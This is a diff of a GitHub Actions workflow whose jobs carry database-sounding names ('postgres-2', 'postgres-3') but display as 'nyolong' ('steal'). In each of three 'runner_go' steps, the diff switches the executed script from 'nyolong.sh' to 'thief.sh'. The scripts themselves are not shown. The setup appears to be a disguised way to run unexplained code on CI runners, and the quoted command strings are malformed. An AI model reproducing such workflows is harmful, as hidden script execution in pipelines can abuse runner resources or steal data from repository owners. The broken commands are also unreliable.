@@ -24,8 +24,8 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
-        "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
+        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
+        "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
   postgres-2:
     name: nyolong-2
     runs-on: ubuntu-18.04
@@ -49,8 +49,8 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
-        "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
+        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
+        "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
   postgres-3:
     name: nyolong-3
     runs-on: ubuntu-18.04
@@ -74,5 +74,5 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
-        "${GITHUB_WORKSPACE}/nyolong.sh && ./nyolong.sh"
+        chmod +x "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
+        "${GITHUB_WORKSPACE}/nyolong.sh && ./thief.sh"
